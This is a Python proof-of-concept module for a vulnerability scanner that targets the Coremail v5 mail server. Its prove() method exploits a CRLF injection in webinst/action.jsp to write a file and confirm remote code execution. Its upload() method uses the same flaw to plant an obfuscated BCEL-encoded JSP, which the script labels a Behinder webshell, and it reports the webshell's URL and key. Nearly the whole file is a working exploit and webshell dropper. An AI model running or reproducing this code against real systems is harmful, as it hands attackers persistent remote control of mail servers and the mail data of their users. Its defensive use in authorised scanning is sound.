#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):

    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.COREMAIL
        self.name = 'coremail v5 getshell'
        self.keyword = ['coremail']
        self.info = 'Get the coremail v5 getshell'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            url = self.base_url + 'webinst/action.jsp'
            data = 'func=checkserver&webServerName=127.0.0.1:6132/%0d@/home/coremail/web/webapp/show_uuid.jsp%20%74%68%69%73%49%73%61%54%65%73%74%2e'
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            async with ClientSession() as session:
                async with session.post(url=url, data =data,headers=headers) as res:
                    if res!=None and res.status == 200:
                        url1 = self.base_url + 'coremail/show_uuid.jsp'
                        async with session.get(url=url1) as res1:
                            if res1 !=None:
                                text1 = await res1.text()
                                if res1.status == 200 and 'thisIsaTest'in text1:
                                    self.flag = 1
                                    self.res.append({"info": url, "key": 'coremail getshell'})

    async def upload(self):
        await self.get_url()
        if self.base_url:
            url = self.base_url + 'webinst/action.jsp'
            data = 'func=checkserver&webServerName=127.0.0.1:6132/%0d@/home/coremail/web/webapp/show_uuid.jsp%20%3C%25Class.forName%28%22%24%24BCEL%24%24%24l%248b%24I%24A%24A%24A%24A%24A%24A%24A%247dT_o%24hE%24Q%249fs%24fe%24d8%24Y%2497%24b6%24%24%24N%24qPr9j%24d8%24b5%24ddsRJ%24g%24e4%24qj%2493%24sR%24VS%24w%245c%24H%24n%2484%24aa%24bd%24bd%24b5s%24cd%24f9%24ee%24b8%24dd%24a3%2489%24a2H%247c%24D%243e%24G%24cf%247dI%24r%2490%24f8%24A%247c%24q%24k%2480%2499%24bb%24c4T%24b4%24e2%24e1vg%24e6%247e%24f3%249b%24d9%24d9%2499%24fd%24e3%24af_%247f%24H%2480%24cf%24a0S%2485%24b7%24c1%24%24%24c3R%24F%249c%24w%2494%24e0%24e32%24dc%24ac%2440%2483%24c4Oh%24f9%24b4%24M%24ac%24Ko%24B%24_C%24d3%2482%24v9%24f6%24z%24a8%24f7%249e%2489%24lE%24t%24U%24d1%24a8%24d37i%24Q%248d%24ba%24W%245c%24da%248e%24pmDd%24f6E%2498%24v%24Lf%24d7%2483%24u0%249b%24e8%24c3%24f8%24be%24F%24d3%24db%24b1%248f%24d6%24cb%24bd%24mR%248f%24b2%24b1%24a7%24d2%24t%24c2%24L%24V%2491%24c5R%2484%24fb%24o%24NH%243f7N%249b%2483%2440%245bP%24ed%24c98Uc%24R%2484%24Y%24a0%24b2%24%24%24c3sJ%24L%24n%248bE%24SA%24dc%24d9%24NB%24f5%24u6%24bbq%24W%24f9%243bGR%24r%24s%2488%24pt%2498I05c%24c1%24f5%24J%24f21%24Z%24beI%24D%24a3R%24ca%24b8o%2484%243c%24fcR%24qyP%24y%24B%24k%24Vc%24f6%24e3%24y%2495%248aH%24Rr%24R%24df%24r%248a%24g%245c%2486%24x%24W%245c%247b%24D%249d%24F%24cd%24ceA%243cV%249d%24L%2487%24ces%24e5%24d1%24t%2492%24a4%2493%24e9%24a7ZE%24fe%24d3%2482H%24t%24c4%24d3%24c2%24D%245d%2460%24ad%24d2O%24eb%248d%247b%2489%24Y%24v%243b%24Y%24tqj6%24i%24K%24e1f%24G%24f1%24cd6%24c9G%24aeL%248f%24T%24T%24ffW%24d5%2489%2492n%24d3il%24ae7%2496d%24u%24b4%24b6%24H%24b6%243a2%24YM%24db%24db%24a4%24f7b%24e1%24ab%24f4d%24c0%245e%24d1l%24c9Ot%2496%24a8%2494I%24de%243dM2%24_%24Md%2481%24b6G%24cc%243b6%24ca%24fe%24ee%247b%248f%249f%24a4%24cadid%24e7H%24d7WC%24bc%24b9%24i%24c4%24bc%24f6r%24dbsC%24V%248d%24cc%24B%24S%249cR%24f4%2460%24c8R%24f5C%24a6%24b4qG%24ca%243c%24W%24a9%24Y%24x%24ac%24LsV%243d_%24a8%24a1%24b7%24b6%24bc%24b2%24ac%2486kk%24x%249f%247f%24e1%2489%243bw%24FY%243du%24fb%24ee%24da%243d%2487%24_mDY%24Y%24f2%2493%24a2%2497%24ec%24c3%24N%24e68%24ad%24c1%24e0%24e1%24D7%24V%2491%24l%248fId%249c%24bb%24a9JB%24n%24Vsn9m%24c7%24e1%24ae%24ce%243c%249d%24bb%24b0%2495U%24de%24d5Jk%24bcx7%24c9%248a%24WdN%24e6%24b4%24Py7%24ce%248c%249bw%24CC%24a58S%24f7t%243bH%24O%24a8%24Q%24h%2485%24409%243f%24cc%24db%2497%24e8%24ef%24ef%24f4%24j%24de%2495%24%24u%24h%24bb%24dd%248e%24d4s%24bb%24af%24q%24ba%24ee%24a9%24e3%243e%24W%249c%24b1%248bX%24e86%2489%24c5%245b%2494%24TZ%24b6%24b0%2482%249a%24f1v%24c1%24c3%24bb%24e4%243f%2460%24d4%24d1%24f4%24b7%24u%24n%249f%2488%24c5%2495%24d0%24f1FL%24ba%247e%24bc%24hD%24od%24e4%24a3%24b3%24c8%24j%24HZ%24ba%245b%24f7%24fb%243b%24abw%24k%24u%24Z%24e7H%24bc%24L%2492%24b6%24b2%24e1%24Q%24d5W%24aa%24fe%24b5%24w%24a8%24b0P%24c2%24a7ACV%24e4E%24ae%24c9%24d9%24b8%248bp%24RjF%24dd%2486%24Tk%24b0Yx%24b7%24b1Y%24836%24b4jp%248b%24fa%24fb%24c6%24ff%24OV%24N%245c%24C%245d%24f9%24f7%24J%24f8%24ca%247b%24a6%24q%24cd%24Z%247b%24fd%245d%24a0%24d1%24_%24e7%24d5%24P%24p%249cH%24Z%24c6%249a%245e%2481%24dc%2492%248f%24df%2493%24Uo%24U%2496%2460%24G%249f%24n%24A%24L%24e6%24a1%24G%2497p%247f%24H%24b5%24S%24cc%24e2g%24d1%24d4%24e1z%24V%24z%24j%24dc%24z%24dcg%249a%24_%24c1z%2491C%24ea%24b8%24ce%24WF%24b8%2486k%24ed%245c%247e%24X%24ae%24e3%245e%2481%24b9%2489%24f3%24cf0%2485x%2480Ek%24ef7%24u%247d%245b%249fz%24J%24d3%247b%24cd%24fa%24ec%24Z%2494%249bgP%24f9%24F%24w%24bd%24d6%24ZT_%24m%24bc%2484n%24f3%24f8%24eaM%24e5%24f4%24O%24d2%24A%24e6W%24c2%24ccj%2498Y%24j3%249a%24c3%24A%24f3%24u%24z%2460%24d0%248fP%24a3%24d0s%2488X%2480ix%24P%24de%24cf9%243eD%24c4%24C%24da%243f%24c0%24af%24O%24a5%24bfQ%24b5%24cah%24c5%24e5%24c6%249f%2488%24b3%24d0%2493%248e%24b0%24f8%24P%24b8%245e%245c%24cc%248e%24F%24A%24A%22%2Ctrue%2C%28ClassLoader%29Class.forName%28%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu006f%5Cu0072%5Cu0067%5Cu002e%5Cu0061%5Cu0070%5Cu0061%5Cu0063%5Cu0068%5Cu0065%5Cu002e%5Cu0062%5Cu0063%5Cu0065%5Cu006c%5Cu002e%5Cu0069%5Cu006e%5Cu0074%5Cu0065%5Cu0072%5Cu006e%5Cu0061%5Cu006c%5Cu002e%5Cu0075%5Cu0074%5Cu0069%5Cu006c%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%5Cu004c%5Cu006f%5Cu0061%5Cu0064%5Cu0065%5Cu0072%22%29.newInstance%28%29%29%3B%25%3E%0d'
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            async with ClientSession() as session:
                async with session.post(url=url,data =data,headers=headers) as res:
                    if res != None and res.status == 200:
                        url1 = self.base_url + 'coremail/show_uuid.jsp'
                        async with session.get(url=url1) as res1:
                            if res1!=None and res1.status == 200 :
                                text1 = await res1.text()
                                if 'Unknown command'in text1:
                                    url2 = self.base_url + 'coremail/us_send_mail.jsp'
                                    async with session.get(url=url2) as res2:
                                        if res2 != None and res2.status == 200 :
                                            self.flag = 1
                                            self.res.append({"info": url2 + '?6bdaefb8010ef88159ba47abdaebe278@', "key": 'behinder webshell'})